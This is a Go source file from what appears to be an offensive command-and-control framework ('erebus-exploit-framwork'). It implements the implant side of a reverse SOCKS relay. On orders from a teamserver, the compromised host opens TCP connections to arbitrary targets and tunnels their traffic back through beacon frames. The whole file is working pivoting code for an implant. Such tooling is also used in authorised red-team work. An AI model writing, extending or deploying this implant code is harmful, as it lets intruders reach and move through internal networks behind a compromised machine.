package tasks

import (
	"context"
	"fmt"
	"io"
	"net"
	"sync"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

const socksMaxFrameData = 32 << 10

var (
	socksMu      sync.Mutex
	socksRelay   bool // reverse SOCKS agent enabled
	socksConns   = map[uint32]net.Conn{}
	socksOut     []*pb.SocksFrame
)

// SocksActive returns true if reverse SOCKS relay is enabled or has open conns.
func SocksActive() bool {
	socksMu.Lock()
	defer socksMu.Unlock()
	return socksRelay || len(socksConns) > 0
}

func executeSocksStart(_ context.Context, data []byte) ([]byte, error) {
	task := &pb.SocksStartTask{}
	if len(data) > 0 {
		if err := proto.Unmarshal(data, task); err != nil {
			return nil, fmt.Errorf("unmarshal socks start task: %w", err)
		}
	}
	port := task.Port
	if port == 0 {
		port = 1080
	}

	socksMu.Lock()
	socksRelay = true
	socksMu.Unlock()

	// Port is informational (teamserver listen port); implant is reverse agent only.
	return proto.Marshal(&pb.SocksStartResult{Success: true, Port: port})
}

func executeSocksStop(_ context.Context, _ []byte) ([]byte, error) {
	socksMu.Lock()
	socksRelay = false
	for id, c := range socksConns {
		c.Close()
		delete(socksConns, id)
	}
	socksOut = nil
	socksMu.Unlock()
	return proto.Marshal(&pb.SocksStopResult{Success: true})
}

// DrainSocksFrames returns and clears outbound implant→server frames.
func DrainSocksFrames() []*pb.SocksFrame {
	socksMu.Lock()
	defer socksMu.Unlock()
	out := socksOut
	socksOut = nil
	return out
}

// RequeueSocksFrames prepends frames after a failed beacon send so they are not lost.
func RequeueSocksFrames(frames []*pb.SocksFrame) {
	if len(frames) == 0 {
		return
	}
	socksMu.Lock()
	socksOut = append(frames, socksOut...)
	socksMu.Unlock()
}

// HandleSocksFrames processes server→implant frames.
func HandleSocksFrames(frames []*pb.SocksFrame) {
	for _, f := range frames {
		if f == nil {
			continue
		}
		switch f.Op {
		case pb.SocksFrameOp_SOCKS_OPEN:
			go socksOpen(f.ConnId, f.Target)
		case pb.SocksFrameOp_SOCKS_DATA:
			socksWrite(f.ConnId, f.Data)
		case pb.SocksFrameOp_SOCKS_CLOSE:
			socksCloseLocal(f.ConnId)
		}
	}
}

func socksEnqueue(f *pb.SocksFrame) {
	socksMu.Lock()
	socksOut = append(socksOut, f)
	socksMu.Unlock()
}

func socksOpen(connID uint32, target string) {
	if target == "" {
		socksEnqueue(&pb.SocksFrame{
			ConnId: connID,
			Op:     pb.SocksFrameOp_SOCKS_OPEN_RESULT,
			Status: -1,
		})
		return
	}
	conn, err := net.Dial("tcp", target)
	if err != nil {
		socksEnqueue(&pb.SocksFrame{
			ConnId: connID,
			Op:     pb.SocksFrameOp_SOCKS_OPEN_RESULT,
			Status: -1,
		})
		return
	}

	socksMu.Lock()
	if !socksRelay {
		socksMu.Unlock()
		conn.Close()
		socksEnqueue(&pb.SocksFrame{
			ConnId: connID,
			Op:     pb.SocksFrameOp_SOCKS_OPEN_RESULT,
			Status: -1,
		})
		return
	}
	if old, ok := socksConns[connID]; ok {
		old.Close()
	}
	socksConns[connID] = conn
	socksMu.Unlock()

	socksEnqueue(&pb.SocksFrame{
		ConnId: connID,
		Op:     pb.SocksFrameOp_SOCKS_OPEN_RESULT,
		Status: 0,
	})

	// Target → server
	buf := make([]byte, socksMaxFrameData)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			socksEnqueue(&pb.SocksFrame{
				ConnId: connID,
				Op:     pb.SocksFrameOp_SOCKS_DATA,
				Data:   data,
			})
		}
		if err != nil {
			if err != io.EOF {
				// ignore
			}
			socksCloseLocal(connID)
			socksEnqueue(&pb.SocksFrame{
				ConnId: connID,
				Op:     pb.SocksFrameOp_SOCKS_CLOSE,
			})
			return
		}
	}
}

func socksWrite(connID uint32, data []byte) {
	socksMu.Lock()
	conn := socksConns[connID]
	socksMu.Unlock()
	if conn == nil || len(data) == 0 {
		return
	}
	if _, err := conn.Write(data); err != nil {
		socksCloseLocal(connID)
		socksEnqueue(&pb.SocksFrame{
			ConnId: connID,
			Op:     pb.SocksFrameOp_SOCKS_CLOSE,
		})
	}
}

func socksCloseLocal(connID uint32) {
	socksMu.Lock()
	conn, ok := socksConns[connID]
	if ok {
		delete(socksConns, connID)
	}
	socksMu.Unlock()
	if ok && conn != nil {
		conn.Close()
	}
}
